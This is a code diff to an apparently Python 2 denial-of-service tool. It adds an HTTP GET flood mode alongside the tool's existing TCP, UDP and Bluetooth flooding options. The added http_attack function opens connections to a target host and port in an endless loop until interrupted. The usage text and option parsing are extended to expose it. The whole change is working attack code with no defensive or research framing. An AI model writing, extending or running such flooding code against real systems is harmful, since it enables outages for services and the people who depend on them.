@@ -21,7 +21,8 @@
 import re
 import socket
 import getopt
-import sys,os,time,random
+import sys,os,time,random,httplib,urllib
+from urlparse import urlparse
 
 
 #################################
@@ -89,9 +90,33 @@ def daemonize (stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
 ##### eth/wlan attacks #####
 ############################
 
+def http_attack():
+    ''' Simple HTTP attacks '''
+    requests_sent = 0
+    timeouts = 0
+    o = urlparse(target)
+    print "Starting HTTP GET flood on \""+o.netloc+":"+str(port)+o.path+"\"..."
+
+    try:
+        while True:
+            try:
+                connection = httplib.HTTPConnection(o.netloc+":"+str(port), timeout=2)
+                connection.request("GET", o.path)
+                requests_sent = requests_sent + 1
+            except Exception as err:
+               if "timed out" in err:
+                   timeouts = timeouts + 1
+
+    except KeyboardInterrupt:
+        print "Info: Maked "+str(requests_sent)+" requests.\nTimeouts: "+str(timeouts)
+
 def eth_attack():
     ''' Ethernet/Wireless attack function '''
     global log, target, debugMode, useProtocol, port
+
+    if useProtocol == "HTTP":
+        http_attack()
+        return
 
     # number of packets for summary
     packets_sent = 0
@@ -178,7 +203,7 @@ def printUsage():
     print "  -h, --help             : display this help"
     print "  -f, --fork             : fork to background"
     print "  -d, --debug            : switch to debug log level"
-    print "  -s, --socket           : use TCP or UDP connection over ethernet/wireless, default TCP, available TCP, UDP, RFC (bluetooth)"
+    print "  -s, --socket           : use TCP or UDP connection over ethernet/wireless, default TCP, available TCP, UDP, RFC (bluetooth), HTTP over ethernet"
     print "  -t, --target           : target adress (bluetooth mac or ip adress over ethernet/wireless)"
     print "  -p, --port             : destination port"
     print "  -b, --bytes            : number of bytes to send in one packet"
@@ -230,6 +255,9 @@ for o, a in opts:
         elif a == "RFC" or a == "rfc" or a == "BT" or a == "bt" or a == "bluetooth" or a == "BLUETOOTH":
             useProtocol = "RFC"
             bluetoothMode = True
+        elif a == "http" or a == "www" or a == "HTTP" or a == "WWW":
+            useProtocol = "HTTP"
+            bluetoothMode = False
 
         if debugMode == True:
             print "Info: Socket type is "+useProtocol
